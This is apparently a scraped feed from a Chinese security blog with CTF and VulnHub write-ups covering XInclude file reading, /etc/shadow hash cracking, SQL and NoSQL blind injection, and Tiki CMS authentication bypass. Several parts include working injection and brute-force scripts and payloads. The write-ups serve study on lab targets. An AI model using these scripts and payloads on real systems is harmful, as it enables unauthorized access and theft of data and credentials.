用jwt-cracker爆破密钥，为mstzt 因为有标签，所以判断为xxe注入，但是正常的xxe他会有过滤，不能引用东西。可以使用XInclude attack关于XInclude attack 读取/app/app.py文件 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118import flaskfrom flask import Flask, render_template, request, url_forimport jwtfrom lxml import etreeimport osimport reimport tempfileapp = Flask(__name__)FLAG = os.environ.get(&#x27;FLAG&#x27;) or &#x27;wcft&#123;fake-flag&#125;&#x27;FLAGUSER_PASSWORD = os.environ.get(&#x27;FLAGUSER_PASSWORD&#x27;) or &#x27;fake-password&#x27;JWT_SECRET = os.environ.get(&#x27;JWT_SECRET&#x27;) or &#x27;secret&#x27;JWT_ALG = &#x27;HS256&#x27;JWT_COOKIE = &#x27;appdata&#x27;@app.route(&#x27;/&#x27;)def root(): return render_template(&quot;index.html&quot;)@app.route(&#x27;/secret-welcome-935734&#x27;, methods=[&#x27;GET&#x27;])def secret_welcome(): # There is a linux user named &#x27;flaguser&#x27; # Login here with that username and their linux password. auth = request.authorization if auth is None or auth.username != &#x27;flaguser&#x27; or auth.password != FLAGUSER_PASSWORD: resp = flask.Response(&#x27;Please provide the right credentials to get the flag&#x27;) resp.headers[&#x27;WWW-Authenticate&#x27;] = &#x27;Basic&#x27; return resp, 401 return f&#x27;Congrats, here is your flag: &#123;FLAG&#125;&#x27;@app.route(&#x27;/welcome&#x27;, methods=[&#x27;GET&#x27;])def welcome(): cookie = request.cookies.get(JWT_COOKIE) if not cookie: return f&#x27;Error: missing &#123;JWT_COOKIE&#125; cookie value&#x27; try: jwtData = jwt.decode(cookie, JWT_SECRET, algorithms=[JWT_ALG]) except: return &#x27;Error: unable to decode JWT cookie&#x27;, 400 data = jwtData[&#x27;data&#x27;] if not data: return &#x27;Error: missing data field from decoded JWT&#x27;, 400 xmlText = str(data) if &#x27;&amp;&#x27; in xmlText: return &#x27;Error: No entity references please&#x27;, 400 if &#x27;%&#x27; in xmlText: return &#x27;Error: No parameter file entities please&#x27;, 400 tmp = tempfile.NamedTemporaryFile() # Open the file for writing. with open(tmp.name, &#x27;w&#x27;) as f: f.write(xmlText) try: parser = etree.XMLParser(resolve_entities=False) xmlDoc = etree.parse(tmp.name, parser=parser) xmlDoc.xinclude() except Exception as e: print(&#x27;XML Error:&#x27;, e) return &#x27;Error: Error parsing XML&#x27;, 400 usernameElement = xmlDoc.find(&#x27;username&#x27;) if usernameElement is None: return &#x27;Error: Missing username element in XML&#x27;, 400 username = usernameElement.text return render_template(&quot;welcome.html&quot;, username=username)@app.route(&#x27;/register&#x27;, methods=[&#x27;POST&#x27;])def register(): username = request.form.get(&#x27;username&#x27;) if not username: return &#x27;Error: username is required&#x27;, 400 username = str(username) if not re.match(&#x27;^[a-z] $&#x27;, username): return &#x27;Error: username must be only lowercase letters&#x27;, 400 if len(username) &lt; 3: return &#x27;Error: username must be at least 3 letters&#x27;, 400 if len(username) &gt; 20: return &#x27;Error: username must be no longer than 20 letters&#x27;, 400 # Useful for chal development # username = &#x27;&lt;xi:include xmlns:xi=&quot;http://www.w3.org/2001/XInclude&quot; href=&quot;/app/app.py&quot; parse=&quot;text&quot;/&gt;&#x27; xml = f&#x27;&lt;data&gt;&lt;username&gt;&#123;username&#125;&lt;/username&gt;&lt;/data&gt;&#x27; jwtData = &#123;&quot;data&quot;: xml&#125; cookie = jwt.encode(jwtData, JWT_SECRET, algorithm=JWT_ALG) response = flask.make_response(f&#x27;hello &#123;username&#125;&#x27;) response.set_cookie(JWT_COOKIE, cookie) response.headers[&#x27;location&#x27;] = url_for(&#x27;welcome&#x27;) return response, 302if __name__ == &quot;__main__&quot;: app.run(debug=False) 在这个文件里可以得知，有一个新的路由/secret-welcome-935734在这里登陆成功后得到flag，用户名为flaguser，密码我们可以用xxe读取/etc/passwd或者/etc/shadow在shadow中我们得知密码为$1$hack$BzqsFHqkPjQ2Sn9amFsgN0这个可以利用hashcat爆破 关于hashcat的用法 爆破出来密码是qqz3登录得到flag","categories":[{"name":"ctf","slug":"ctf","permalink":"https://lvzhouhang.xyz/categories/ctf/"},{"name":"复盘","slug":"ctf/复盘","permalink":"https://lvzhouhang.xyz/categories/ctf/%E5%A4%8D%E7%9B%98/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://lvzhouhang.xyz/tags/ctf/"}]},{"title":"java注入学习","slug":"java注入学习","date":"2024-03-16T12:56:44.000Z","updated":"2025-04-19T13:25:36.797Z","comments":true,"path":"2024/03/16/java注入学习/","permalink":"https://lvzhouhang.xyz/2024/03/16/java%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"JDBCJDBC是什么Java DataBase Connectivity（Java语言连接数据库） 接口或类 作用 DriverManager类 1)管理和注册数据库驱动2)得到数据库连接对象 Connection接口 一个连接对象，可用于创建Statement和PreparedStatement对象 Statemen接口 一个SQL语句对象，用于将SQL语句发送给数据库服务器 PreparedStetemen接口 一个SQL语句对象，是Statemen的子接口 ResultSet接口 用于封装数据库查询的结果集，返回给数据库Java程序 加载和注册驱动的方法 描述 Class.forName(数据库驱动实现类) 加载和注册数据库驱动，数据库驱动由mysql厂商”com.mysql.jbdc.Driver” PrepareStatement会对SQL语句进行预编译，但如果直接采取拼接的方式构造SQL，此时进行预编译也无用。 Statement不会对SQL语句进行预编译。 两种操作都是因为SQL语句拼接导致的SQL注入。 MyBatis框架在mybatis中的，使用#包裹的字段在内部进行了预编译处理，而$并没有使用预编译，也就是JDBC中prepareStatement和Statement的区别。mybatis的sql语句通常是写在xml文件中。 order by 盲注在SQL中是不允许union直接跟在order by后面的，所以我们可以考虑使用盲注或报错注入。 我的理解就是通过order by将列进行排序，通过返回的不同结果 举个简单的例子: 1234567891011121314151617181920212223MariaDB [test]&gt; select * from user order by (if(substr((select username from user limit 0,1),1,1)=&#x27;1&#x27;,sleep(1),1));+------------------+------------+| username | password |+------------------+------------+| Nakajima Ayato | 9CXLGSEWDO || Mildred Green | r8ZPbvDXBC || Ito Momoe | qao7ysP90D || Lo On Kay | x8rGVqTQqd || Kobayashi Sakura | lYiv7UO8Yo |+------------------+------------+5 rows in set (0.002 sec)MariaDB [test]&gt; select * from user order by (if(substr((select username from user limit 0,1),1,1)=&#x27;N&#x27;,sleep(1),1));+------------------+------------+| username | password |+------------------+------------+| Nakajima Ayato | 9CXLGSEWDO || Mildred Green | r8ZPbvDXBC || Ito Momoe | qao7ysP90D || Lo On Kay | x8rGVqTQqd || Kobayashi Sakura | lYiv7UO8Yo |+------------------+------------+5 rows in set (5.004 sec) 可以看到，当if语句成立时返回的时间为5s，但是不成立时为0.002s 这是基于时间的盲注。 还可以利用其它的方式来进行盲注 例如： 12MariaDB [test]&gt; select * from user order by if(substr((select username from user limit 0,1),1,1)=&#x27;a&#x27;,1,(select host from mysql.user));ERROR 1242 (21000): Subquery returns more than 1 row 如果if语句错误就会返回ERROR 1242 (21000): Subquery returns more than 1 row，当if成立时就会返回正常页面，可以通过返回的情况来判断。 rand()盲注原理和order by大差不差，就是rand()会产生一个0-1之间的随机数，我们给一个固定的种子就会生成一个固定的数，所以我们控制rand的种子就可以造成排序的结果不同。 比如： 12345rand(1)rand(0)rand(1=1)rand(lenth(database())=8).... #和$符号的区别#{} 使用#{}意味着使用的预编译的语句，即在使用jdbc时的preparedStatement，sql语句中如果存在参数则会使用?作占位符，我们知道这种方式可以防止sql注入，并且在使用#{}时形成的sql语句，已经带有引号，例，select * from table1 where id=#{id} 在调用这个语句时我们可以通过后台看到打印出的sql为：select * from table1 where id=’2’ 加入传的值为2.也就是说在组成sql语句的时候把参数默认为字符串。 ${} 使用${}时的sql不会当做字符串处理，是什么就是什么，如上边的语句：select * from table1 where id=${id} 在调用这个语句时控制台打印的为：select * from table1 where id=2 ，假设传的参数值为2 从上边的介绍可以看出这两种方式的区别，我们最好是能用#{}则用它，因为它可以防止sql注入，且是预编译的，在需要原样输出时才使用${}，如， select * from ${tableName} order by ${id} 这里需要传入表名和按照哪个列进行排序 ，加入传入table1、id 则语句为：select * from table1 order by id 如果是使用#{} 则变成了select * from ‘table1’ order by ‘id’ 我们知道这样就不对了。 另，在使用以下的配置时，必须使用#{} 1234&lt;select id=&quot;selectMessageByIdI&quot; parameterType=&quot;int&quot; resultType=&quot;Message&quot;&gt; select * from message where id=#&#123;id&#125;; &lt;/select&gt; 在parameterType是int时，sql语句中必须是#{}。 参考链接 关于Java中order by注入详解","categories":[{"name":"web","slug":"web","permalink":"https://lvzhouhang.xyz/categories/web/"},{"name":"java","slug":"web/java","permalink":"https://lvzhouhang.xyz/categories/web/java/"}],"tags":[{"name":"web","slug":"web","permalink":"https://lvzhouhang.xyz/tags/web/"},{"name":"sql","slug":"sql","permalink":"https://lvzhouhang.xyz/tags/sql/"}]},{"title":"NoSQL注入","slug":"NoSQL注入","date":"2024-03-12T07:28:01.000Z","updated":"2025-04-19T13:25:36.771Z","comments":true,"path":"2024/03/12/NoSQL注入/","permalink":"https://lvzhouhang.xyz/2024/03/12/NoSQL%E6%B3%A8%E5%85%A5/","excerpt":"","text":"什么是NoSQLNoSQL，指的是非关系型的数据库。NoSQL 有时也称作 Not Only SQL 的缩写，是对不同于传统的关系型数据库的数据库管理系统的统称。NoSQL 用于超大规模数据的存储。（例如谷歌或 Facebook 每天为他们的用户收集万亿比特的数据）。这些类型的数据存储不需要固定的模式，无需多余操作就可以横向扩展。 NoSQL 提供了新的数据模型和查询格式，从而可以规避常规的 SQL 注入攻击。但是，它们也为攻击者提供了插入恶意代码的新方法。总的来讲有四种注入手法： 1、重言式 又称为永真式（这个好像是数理逻辑里面的术语），此类攻击是在条件语句中注入代码，使生成的表达式判定结果永远为真，从而绕过认证或访问机制。 2、联合查询 联合查询是一种众所周知的SQL注入技术，攻击者利用一个脆弱的参数去改变给定查询返回的数据集。联合查询最常用的用法是绕过认证页面获取数据。 3、JavaScript 注入 MongoDB Server 支持 JavaScript，这使得在数据引擎进行复杂事务和查询成为可能，传递不干净的用户输入到这些查询中可以注入任意 JavaScript 代码，导致非法的数据获取或篡改。 4、盲注 当页面没有回显时，那么我们可以通过$regex正则表达式来达到和 SQL 注入中substr()函数相同的功能，而且 NoSQL 用到的基本上都是布尔盲注。 对于 PHP 本身的特性而言，由于其松散的数组特性，导致如果我们输入value=1那么，也就是输入了一个 value 的值为 1 的数据。如果输入value[$ne]=1也就意味着value=array($ne=&gt;1),在 MongoDB 中，原来的一个单个目标的查询变成了条件查询。同样的，我们也可以使用username[$gt]=&amp;password[$gt]=作为 payload 进行攻击。 在我看来，nosql注入就是通过传入数组然后拼接恶意语句造成注入，和其他数据库的注入原理类似，但是语法有所不同。 查询操作符 nosql的查询操作符不用or、and、=等等，取而代之的是$eq、$ne、$gt等 方法名 描述 $gt 大于 $lte 小于等于 $in 包含 $nin 不包含 $lt 小于 $gte 大于等于 $ne 不等于 $eq 等于 $and 与 $nor $nor在NOR一个或多个查询表达式的数组上执行逻辑运算，并选择 对该数组中所有查询表达式都失败的文档 $not 反匹配(1.3.3及以上版本),字段值不匹配表达式或者字段值不存在 $or 或 例如： 我们传入username=admin&amp;password=123456 后端就会处理成 1234array(&#x27;username&#x27; =&gt; &#x27;admin&#x27;,&#x27;password&#x27; =&gt; &#x27;123456&#x27;) 如果我们传入username[$ne]=1&amp;password[$ne]=1 后端处理成 1234array(&#x27;username&#x27; =&gt; array(&#x27;$ne&#x27; =&gt; 1),&#x27;password&#x27; =&gt; array(&#x27;$ne&#x27; =&gt; 1)) 查询的语句就会变成db.users.find(&#123;&#39;username&#39;:&#123;$ne:1&#125;, &#39;password&#39;:&#123;$ne:1&#125;&#125;) 意思就是查询username不等于1，password不等于1的用户 此外,nosql还可以进行javascrip注入 例如：db.users.find( &#123; $where: function() &#123; return this.username == &#39;admin&#39;; &#125; &#125; ) 该查询返回在users集合中username等于admin的所有文档。 参考链接从零学习 NoSQL 注入之 Mongodb get-started-with-nosql-injection-nosqli","categories":[{"name":"web","slug":"web","permalink":"https://lvzhouhang.xyz/categories/web/"}],"tags":[{"name":"web","slug":"web","permalink":"https://lvzhouhang.xyz/tags/web/"},{"name":"sql","slug":"sql","permalink":"https://lvzhouhang.xyz/tags/sql/"}]},{"title":"sql异或注入","slug":"sql异或注入","date":"2024-03-01T02:03:30.000Z","updated":"2025-04-19T13:25:36.771Z","comments":true,"path":"2024/03/01/sql异或注入/","permalink":"https://lvzhouhang.xyz/2024/03/01/sql%E5%BC%82%E6%88%96%E6%B3%A8%E5%85%A5/","excerpt":"","text":"sql异或注入当waf过滤了很多东西，但是没有过滤异或(^)符的时候使用。 什么是异或注入异步注入说简单一点就是在构造where后面的判断条件时使用^（异或符号）来达到sql注入攻击的目的 1^1=0 1^0=1 异或注入就是利用sql语句来进行盲注 例如： 1select * from student where Sname=1^(substr(database(),$变量1$,1)=$变量2$); 这里就是看数据库的第变量1个字符是否等于变量2，如果相等就会变成1^1返回的是0，所以我们应该在最后再异或一个1 1select * from student where Sname=1^(substr(database(),$变量1$,1)=$变量2$)^1; 这样如果数据库的第变量1个字符等于变量2就会返回1，然后再配合脚本实现异或注入 脚本: 1234567891011121314151617181920212223242526272829303132333435import requestsimport timeurl = &quot;&quot;pay=&#x27;&#x27;column = &quot;&quot;for i in range(1, 1000): time.sleep(0.06) low = 32 high = 128 mid = (low + high) // 2 while (low &lt; high): # 库名 #temp[&quot;id&quot;] = &quot;1^(ascii(substr((select(group_concat(schema_name))from(information_schema.schemata)),%d,1))&gt;%d)^1&quot; % (i, mid) # 表名 # temp[&quot;id&quot;] = &quot;1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),%d,1))&gt;%d)^1&quot; %(i,mid) # 字段名 # temp[&quot;id&quot;] = &quot;1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;F1naI1y&#x27;)),%d,1))&gt;%d)^1&quot; %(i,mid) # 内容 pay = &quot;1^(ascii(substr((select(group_concat(password))from(F1naI1y)),%d,1))&gt;%d)^1&quot; %(i,mid) r = requests.get(url+pay) time.sleep(0.04) print(low, high, mid, &quot;:&quot;) if &quot;Click&quot; in r.text: #自行更改返回字符 low = mid + 1 else: high = mid mid = (low + high) // 2 if (mid == 32 or mid == 127): break column += chr(mid) print(column)print(&quot;All:&quot;, column)","categories":[{"name":"web","slug":"web","permalink":"https://lvzhouhang.xyz/categories/web/"}],"tags":[{"name":"web","slug":"web","permalink":"https://lvzhouhang.xyz/tags/web/"},{"name":"sql","slug":"sql","permalink":"https://lvzhouhang.xyz/tags/sql/"}]},{"title":"PHP语法构造和变量函数","slug":"PHP语法构造和变量函数","date":"2024-02-29T02:51:06.000Z","updated":"2025-04-19T13:25:36.771Z","comments":true,"path":"2024/02/29/PHP语法构造和变量函数/","permalink":"https://lvzhouhang.xyz/2024/02/29/PHP%E8%AF%AD%E6%B3%95%E6%9E%84%E9%80%A0%E5%92%8C%E5%8F%98%E9%87%8F%E5%87%BD%E6%95%B0/","excerpt":"","text":"昨天我发现了一个问题 1234&lt;?php$a=&#x27;693741&#x27;;$a=base_convert($a,10,36);$a(system(&quot;dir&quot;)); $a是36进制的eval转换成的10进制 所以这个代码其实就是eval(system(&quot;dir&quot;));，但是运行的时候却报错了 1PHP Fatal error: Uncaught Error: Call to undefined function eval() 然后去网上了解了才知道 eval 属于PHP语法构造的一部分，并不是一个函数，所以不能通过 变量函数 的形式来调用` 类似的语法构造还有：echo，print，unset()，isset()，empty()，include，require… 就比如 123456789print &quot;asdasd&quot;;&gt;asdasdfunction myprint($a)&#123; print $a;&#125;myprint &quot;asdasdasd&quot;;&gt;Parse error: syntax error, unexpected &#x27;&quot;asdasdasd&quot;&#x27; (T_CONSTANT_ENCAPSED_STRING) 直接print &quot;asdasd&quot;就可以打印出字符，但是自己构造的函数却没有办法这样。 所以网上有的一句话木马来调用eval的其实都不可以,换成assert就可以了。","categories":[{"name":"web","slug":"web","permalink":"https://lvzhouhang.xyz/categories/web/"}],"tags":[{"name":"web","slug":"web","permalink":"https://lvzhouhang.xyz/tags/web/"}]},{"title":"order by 盲注","slug":"order-by-盲注","date":"2024-02-11T11:11:39.000Z","updated":"2025-04-19T13:25:36.771Z","comments":true,"path":"2024/02/11/order-by-盲注/","permalink":"https://lvzhouhang.xyz/2024/02/11/order-by-%E7%9B%B2%E6%B3%A8/","excerpt":"","text":"order by比较大小盲注 这是表里的所有东西 如果我们执行select * from flag where id=&#39;&#39; or 1 union select 1,1 order by 2;会出现 不能用and否则就相当于创建了一个虚拟的表，查询不到原来的数据。 我们知道flag的第一位是f，如果我们查询select * from flag where id=&#39;&#39; or 1 union select 1,&#39;f&#39; order by 2;会发生什么呢？ 还是这样，第一行没什么用，但是如果我们查询的是g的话就会变成这样 flag的值就会出现在第一行，我们就可以利用这一点来进行order by盲注 脚本: 1234567891011121314151617import requestsimport stringurl=&quot;http://4ef0329e-10b4-4bd1-bf0a-0d80fe83129d.challenge.ctf.show/&quot;str=string.digits+string.ascii_lettersflag=&#x27;&#x27;j=&#x27;&#x27;for i in range(1,50): for s in str: data = &#123; &#x27;username&#x27;: &quot;&#x27; or 1 union select 1,2,&#x27;&#123;0&#125;&#x27; order by 3#&quot;.format(flag+s), &#x27;password&#x27;: &#x27;1111&#x27; &#125; r=requests.post(url,data=data) if &quot;&lt;/code&gt;admin&quot; in r.text: flag+=chr(ord(s)-1) print(flag) break; 根据脚本自行修改","categories":[{"name":"web","slug":"web","permalink":"https://lvzhouhang.xyz/categories/web/"}],"tags":[{"name":"web","slug":"web","permalink":"https://lvzhouhang.xyz/tags/web/"},{"name":"sql","slug":"sql","permalink":"https://lvzhouhang.xyz/tags/sql/"}]},{"title":"Tiki:1","slug":"Tiki-1","date":"2023-12-04T10:57:21.000Z","updated":"2025-04-19T13:25:36.771Z","comments":true,"path":"2023/12/04/Tiki-1/","permalink":"https://lvzhouhang.xyz/2023/12/04/Tiki-1/","excerpt":"","text":"描述哦，不，我们的网络服务器受到了损害。攻击者使用了0day，所以我们不知道他是如何进入管理面板的。调查一下。 这是一个 OSCP Prep Box，它基于我最近发现的 CVE。它位于 OSCP 实验室机器级别。 渗透过程首先就是信息搜集，靶机的ip用nmap或者netdiscover都可以 靶机ip：192.168.56.102 然后扫描一下全部的端口 nmap -sS -p- 192.168.56.102 -T4 --min-rate 1000 -oN nmap.txt 结果如下： 12345PORT STATE SERVICE22/tcp open ssh80/tcp open http139/tcp open netbios-ssn445/tcp open microsoft-ds 然后扫一下端口的信息，和服务的版本 nmap -sV -sC -O -p22,80,139,445 192.168.56.102 123456789101112131415161718192021222324252627282930313233343536PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 a3d84a89a9256d07c53d762806edd1c0 (RSA)| 256 e7b289055457dc02f48c3a7c558b51aa (ECDSA)|_ 256 fd77072b4a163a016be0000c0a36d82f (ED25519)80/tcp open http Apache httpd 2.4.41 ((Ubuntu))| http-robots.txt: 1 disallowed entry |_/tiki/|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-toc: truetitle: Apache2 Ubuntu Default Page: It works139/tcp open netbios-ssn Samba smbd 4.6.2445/tcp open netbios-ssn Samba smbd 4.6.2MAC Address: 08:00:27:26:96:01 (Oracle VirtualBox virtual NIC)Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed portDevice type: general purposeRunning: Linux 4.X|5.XOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5OS details: Linux 4.15 - 5.6Network Distance: 1 hopService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelHost script results:|_clock-skew: 7h59m57s| smb2-security-mode: | 311: |_ Message signing enabled but not required|_nbstat: NetBIOS name: UBUNTU, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 000000000000 (Xerox)| smb2-time: | date: 2023-12-04T20:55:56|_ start_date: N/AOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 28.95 seconds 可以发现有samba服务，可以对samba进行枚举 用enum4linux跑一下可以找到silky的用户,用smbclient列举一下共享的资源 smbclient -L IP 123456Sharename Type Comment--------- ---- -------print$ Disk Printer DriversNotes Disk My NotesIPC$ IPC IPC Service (ubuntu server (Samba, Ubuntu)) 能找到Notes，连接一下smbclient //192.168.56.102/Notes有一个Mail.txt 下载下来查看 12345678910#Mail.txtHi Silkybecause of a current Breach we had to change all Passwords,please note that it was a 0day, we don&#x27;t know how he made it.Your new CMS-password is now 51lky571k1, please investigate how he made it into our Admin Panel.Cheers Boss. 可以看到cms的密码，登录之后没什么用。 查看cms有没有什么历史漏洞 searchsploit tiki cms 1234567891011121314151617---------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path---------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------Tiki Wiki CMS 15.0 - Arbitrary File Download | php/webapps/40080.txtTiki Wiki CMS Calendar 6.15/9.11 LTS/12.5 LTS/14.2 - Remote Code Execution | php/webapps/39965.txtTiki Wiki CMS Groupware - &#x27;url&#x27; Open Redirection | php/webapps/36848.txtTiki Wiki CMS Groupware 21.1 - Authentication Bypass | php/webapps/48927.pyTiki Wiki CMS Groupware 5.2 - Multiple Vulnerabilities | php/webapps/15174.txtTiki Wiki CMS Groupware 7.2 - &#x27;snarf_ajax.php&#x27; Cross-Site Scripting | php/webapps/35974.txtTiki Wiki CMS Groupware 8.1 - &#x27;show_errors&#x27; HTML Injection | php/webapps/36470.txtTiki Wiki CMS Groupware 8.2 - &#x27;snarf_ajax.php&#x27; Remote PHP Code Injection | php/webapps/18265.txtTiki Wiki CMS Groupware 8.3 - &#x27;Unserialize()&#x27; PHP Code Execution | php/webapps/19573.phpTiki Wiki CMS Groupware 8.3 - &#x27;Unserialize()&#x27; PHP Code Execution (Metasploit) | php/webapps/19630.rb---------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------Shellcodes: No ResultsPapers: No Results 查看web服务cms的版本用dirsearch可以找到一个changelog 访问可以看到版本为21.1，正好有一个历史漏洞 用searchsploit tiki cms -m 48927 将脚本下载下来运行，重置admin的密码为空,然后用admin登录bp抓包修改登录密码为空，成功登录。在lastchange的Credentials里可以找到silky:Agy8Y7SPJNXQzqA 这个是ssh的密码，用ssh连接，查看id，发现用户在sodu组下，可以直接sudo su提权。 小结一开始靶场搭建的时候出了点问题导致发现不了靶机的地址，是因为我的攻击机和靶机不在一个局域网内，将靶机的网卡和攻击机桥接在一起就可以了 记录下来的只有正确的路线，渗透过程中还要去试着探索其他的功能点","categories":[{"name":"boot2root","slug":"boot2root","permalink":"https://lvzhouhang.xyz/categories/boot2root/"}],"tags":[{"name":"vulnhub","slug":"vulnhub","permalink":"https://lvzhouhang.xyz/tags/vulnhub/"}]},{"title":"1337_UP_LIVE_CTF 2023","slug":"1337_up_live_Ctf","date":"2023-11-22T12:14:04.000Z","updated":"2025-04-19T13:25:36.810Z","comments":true,"path":"2023/11/22/1337_up_live_Ctf/","permalink":"https://lvzhouhang.xyz/2023/11/22/1337_up_live_Ctf/","excerpt":"","text":"CTFC刷题的时候见到过这种题，其实就是注入+爆破嘛，但之前遇到的是sql注入的，这说明现在数据库类型见的不多 题目给了一个附件 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677#app.pyfrom flask import Flask,render_template,request,session,redirectimport pymongoimport osfrom functools import wrapsfrom datetime import timedeltafrom hashlib import md5from time import sleepapp = Flask(__name__)app.secret_key = os.environ[&#x27;SECRET_KEY&#x27;]# db settingsclient = pymongo.MongoClient(&#x27;localhost&#x27;,27017)db = client.ctfdbdef createChalls(): db.challs.insert_one(&#123;&quot;_id&quot;: &quot;28c8edde3d61a0411511d3b1866f0636&quot;,&quot;challenge_name&quot;: &quot;Crack It&quot;,&quot;category&quot;: &quot;hash&quot;,&quot;challenge_description&quot;: &quot;My friend sent me this random string `cc4d73605e19217bf2269a08d22d8ae2` can you identify what it is? , flag format: CTFC&#123;&lt;password&gt;&#125;&quot;,&quot;challenge_flag&quot;: &quot;CTFC&#123;cryptocat&#125;&quot;,&quot;points&quot;: &quot;500&quot;,&quot;released&quot;: &quot;True&quot;&#125;) db.challs.insert_one(&#123;&quot;_id&quot;: &quot;665f644e43731ff9db3d341da5c827e1&quot;,&quot;challenge_name&quot;: &quot;MeoW sixty IV&quot;,&quot;category&quot;: &quot;crypto&quot;,&quot;challenge_description&quot;: &quot;hello everyoneeeeeeeee Q1RGQ3tuMHdfZzBfNF90aDNfcjM0TF9mbDRHfQ==, oops sorry my cat ran into my keyboard, and typed these random characters&quot;,&quot;challenge_flag&quot;: &quot;CTFC&#123;n0w_g0_4_th3_r34L_fl4G&#125;&quot;,&quot;points&quot;: &quot;1000&quot;,&quot;released&quot;: &quot;True&quot;&#125;) db.challs.insert_one(&#123;&quot;_id&quot;: &quot;38026ed22fc1a91d92b5d2ef93540f20&quot;,&quot;challenge_name&quot;: &quot;ImPAWSIBLE&quot;,&quot;category&quot;: &quot;web&quot;,&quot;challenge_description&quot;: &quot;well, this challenge is not fully created yet, but we have the flag for it&quot;,&quot;challenge_flag&quot;: os.environ[&#x27;CHALL_FLAG&#x27;],&quot;points&quot;: &quot;1500&quot;,&quot;released&quot;: &quot;False&quot;&#125;)# login checkdef check_login(f): @wraps(f) def wrap(*args,**kwrags): if &#x27;user&#x27; in session: return f(*args,**kwrags) else: return render_template(&#x27;dashboard.html&#x27;) return wrap# routesfrom user import routes@app.route(&#x27;/&#x27;)@check_logindef dashboard(): challs = [] for data in db.challs.find(): del data[&#x27;challenge_flag&#x27;] challs.append(data) chall_1 = challs[0] chall_2 = challs[1] return render_template(&#x27;t_dashboard.html&#x27;,username=session[&#x27;user&#x27;][&#x27;username&#x27;],chall_1=chall_1,chall_2=chall_2)@app.route(&#x27;/register&#x27;)def register(): return render_template(&#x27;register.html&#x27;)@app.route(&#x27;/login&#x27;)def login(): return render_template(&#x27;login.html&#x27;)@app.route(&#x27;/logout&#x27;)def logout(): session.clear() return redirect(&#x27;/&#x27;)@app.route(&#x27;/submit_flag&#x27;,methods=[&#x27;POST&#x27;])@check_logindef submit_flag(): _id = request.json.get(&#x27;_id&#x27;)[-1] submitted_flag = request.json.get(&#x27;challenge_flag&#x27;) chall_details = db.challs.find_one( &#123; &quot;_id&quot;: md5(md5(str(_id).encode(&#x27;utf-8&#x27;)).hexdigest().encode(&#x27;utf-8&#x27;)).hexdigest(), &quot;challenge_flag&quot;:submitted_flag &#125; ) if chall_details == None: return &quot;wrong flag!&quot; else: return &quot;correct flag!&quot;# wait untill mongodb start then create the challs in dbsleep(10)createChalls() 能看出是MongoDB可以用$regex 进行正则匹配 exp: 1234567891011121314151617181920212223242526272829import requests, stringfrom urllib3.exceptions import InsecureRequestWarningrequests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)headers = &#123; &#x27;Content-Type&#x27;: &#x27;application/json&#x27;&#125;cookies = &#123; &#x27;session&#x27;: &#x27;eyJ1c2VyIjp7Il9pZCI6IjNhZDFlZGRlODNkMzRmMjhiZTMwMDdiYTIxOWQzZDUyIiwidXNlcm5hbWUiOiJhc2Rhc2QifX0.ZVoXtA.-obI_0v_QOu3KgulYZCyrYukpiM&#x27;&#125; #登录的sessionflag = &#x27;&#x27;while True: for l in string.ascii_letters + string.digits + &quot;_&#123;&#125;&quot;: data = &#x27;&#123;&quot;_id&quot;:&quot;_id:3&quot;,&quot;challenge_flag&quot;:&#123;&quot;$regex&quot;:&quot;^&#x27; + flag + l + &#x27;.*&quot;&#125;&#125;&#x27; print(data) data = requests.post(&#x27;https://ctfc2.ctf.intigriti.io/submit_flag&#x27;, data = data, headers = headers, cookies = cookies, verify=False) print(data.text) if &#x27;correct flag!&#x27; in data.text: flag += l print(flag) break else: print(&#x27;Failed&#x27;) exit(1) Bug Bank有两种解法，预期解我也没看懂，非预期解就很简单了，通过转钱的功能转-100000000原账号就会减-100000000就会变成正的，就可以买flag了 预期解可以参考： 123https://github.com/opabravo/security-writeups/blob/main/ctf/2023-11-17%20Intigriti%201337up%20CTF%202023.mdhttps://portswigger.net/research/hijacking-service-workers-via-dom-clobbering Smarty Pants123456789101112131415161718192021222324252627282930313233343536373839404142#index.php&lt;?phpif(isset($_GET[&#x27;source&#x27;]))&#123; highlight_file(__FILE__); die();&#125;require(&#x27;/var/www/vendor/smarty/smarty/libs/Smarty.class.php&#x27;);$smarty = new Smarty();$smarty-&gt;setTemplateDir(&#x27;/tmp/smarty/templates&#x27;);$smarty-&gt;setCompileDir(&#x27;/tmp/smarty/templates_c&#x27;);$smarty-&gt;setCacheDir(&#x27;/tmp/smarty/cache&#x27;);$smarty-&gt;setConfigDir(&#x27;/tmp/smarty/configs&#x27;);$pattern = &#x27;/(\\b)(on\\S+)(\\s*)=|javascript|&lt;(|\\/|[^\\/&gt;][^&gt;]+|\\/[^&gt;][^&gt;]+)&gt;|(&#123;+.*&#125;+)/&#x27;;if(!isset($_POST[&#x27;data&#x27;]))&#123; $smarty-&gt;assign(&#x27;pattern&#x27;, $pattern); $smarty-&gt;display(&#x27;index.tpl&#x27;); exit();&#125;// returns true if data is maliciousfunction check_data($data)&#123; global $pattern; return preg_match($pattern,$data);&#125;if(check_data($_POST[&#x27;data&#x27;]))&#123; $smarty-&gt;assign(&#x27;pattern&#x27;, $pattern); $smarty-&gt;assign(&#x27;error&#x27;, &#x27;Malicious Inputs Detected&#x27;); $smarty-&gt;display(&#x27;index.tpl&#x27;); 